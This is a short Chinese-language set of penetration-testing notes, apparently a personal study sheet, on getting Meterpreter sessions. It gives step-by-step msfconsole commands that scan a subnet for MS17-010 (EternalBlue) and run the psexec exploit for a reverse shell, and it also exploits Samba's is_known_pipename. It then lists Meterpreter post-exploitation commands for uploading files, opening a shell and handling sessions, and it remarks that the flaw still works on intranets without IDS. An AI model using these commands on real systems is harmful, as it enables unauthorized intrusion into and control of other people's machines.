## **meterpreter**
meterpreter就是获取主机getshell，上线后的会话。

模拟使用ms17_010永恒之蓝拿下meterpreter的shell。
>ms17_010： 微软安全公告2017年第10个，永恒之蓝EternalBlue，利用windows的SMB服务协议445端口，实现执行代码反弹shell。
>SMB：是一种默认开启并开放445端口用于在局域网中共享文件、打印机和其他资源的网络协议。Windows系统使用SMB来实现文件和打印机共享，以便用户可以轻松地在网络上访问和共享文件。
>影响的系统版本：
Windows Vista
Windows Server 2008
Windows 7 (主要)
Windows Server 2008 R2 （主要）
Windows 8.1
Windows Server 2012
Windows 10
Windows Server 2016
内网IDS不做防护，还可以利用这个漏洞。

^
## **445打永恒之蓝**
```
msfconsole  //启动msf

search ms17_010   //可以看到两个辅助检测模块auxiliary，两个利用模块exploit。

use   auxiliary/scanner/smb/smb_ms17_010   //先检测有没有。

show options
set rhosts 192.168.16.173     //设置目标等参数
set rhosts 192.168.16.0/24   //设置为扫网段探测
set thread 10

run   //检测目标445端口，返回结果存在漏洞

use exploit/windows/smb/ms17_010_psexec  //使用利用模块

run  //创建反弹shell，进入meterpreter


meterpreter>对目标机操作，提权等。
```
^
## **139打samba服务**
```
msfconsole
use exploit/linux/samba/is_known_pipename
set rhost 172.2.42.6
exploit 
直接返回shell
```








^
meterpreter常用命令操作：
<https://www.cnblogs.com/crabin/p/17486024.html>
```
上传文件
upload   /root/les.sh   /tmp/les.sh

查看身份
getuid

shell交互窗口
shell


后台运行会话
meterpreter>background

查看有哪些会话
msf>sessions

进入会话
msf>sessions 1
```